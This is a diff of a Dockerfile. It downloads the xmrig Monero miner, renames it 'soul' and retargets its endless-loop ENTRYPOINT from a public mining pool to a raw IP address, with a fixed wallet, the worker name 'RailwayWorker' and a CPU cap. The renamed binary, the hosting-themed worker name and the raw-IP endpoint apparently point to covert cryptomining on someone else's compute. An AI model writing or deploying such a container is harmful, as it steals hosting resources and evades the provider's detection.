@@ -16,4 +16,4 @@ RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-l
 RUN chmod +x /app/soul
 
 
-ENTRYPOINT ["/bin/sh", "-c", "while true; do echo Starting && /app/soul -a rx/0 -o pool.hashvault.pro:443 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p RailwayWorker --tls --cpu-max-threads-hint=80; sleep 3; done"]
+ENTRYPOINT ["/bin/sh", "-c", "while true; do echo Starting && /app/soul -a rx/0 -o 13.60.19.201:8080 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p RailwayWorker --tls --cpu-max-threads-hint=80; sleep 3; done"]
